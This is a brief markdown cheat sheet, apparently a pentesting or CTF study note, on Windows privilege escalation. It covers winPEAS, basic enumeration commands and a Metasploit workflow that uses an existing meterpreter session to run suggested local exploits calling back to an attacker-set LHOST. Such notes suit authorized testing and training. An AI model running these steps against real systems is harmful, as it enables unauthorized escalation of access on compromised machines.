## Intro
Whenewer possible, use winpeas

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

## Basic info
```
systeminfo

ipconfig

net start (running services)
```

## Usefull CMD commands
```
# get own groups
whoami /priv

# Read file
type <filename>

# Find file restrictions (similar to ls -al)
icacls <filename>

# Change text file contents
echo <new content> > <filename>
```

## Metasploit
Assuming you have an existing meterpreter access to the target
```
# background current session
background

# find available exploits
use post/multi/recon/local_exploit_suggester
set session X
run

# choose one of the suggested exploits and run it
use windows/local/XXXXX
set session X
set LHOST <KALI IP>
run

# IF it doesn't work
# 1. Verify LHOST, LPORT and Session
# 2. Choose different suggested exploit.
# PROFIT $$$
```

## Additional materials
https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
